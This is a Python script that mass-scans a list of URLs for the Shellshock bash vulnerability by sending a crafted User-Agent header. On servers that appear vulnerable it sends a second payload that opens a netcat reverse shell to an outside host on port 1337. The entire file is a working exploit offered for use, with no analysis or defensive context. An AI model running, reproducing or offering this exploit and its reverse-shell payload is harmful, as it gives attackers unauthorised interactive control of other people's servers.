#!/usr/bin/python

import requests,sys

if (len(sys.argv) < 2):
   print ("Usage: shocktest.py file.txt")
   exit(0)

def main():
  file = sys.argv[1]
  with open(file) as f:
    file = f.read().splitlines()
    for url in file:
     cmd="() { test;};/bin/nopatchobfu"
     headers = {'user-agent': cmd}
     r=requests.get(url, headers=headers)
     if r.status_code == 500:
       print (url,"is Vulnerable")
       print ("Exploting..")
       exp = '() { :; }; /bin/bash -c "nc -v 1.0.0.1 1337 -e /bin/bash -i"'
       head = {'user-agent':exp}
       r=requests.get(url, headers=head)
     elif r.status_code:
       print (url, "is not Vulnerable")

if __name__ == "__main__":
 main()
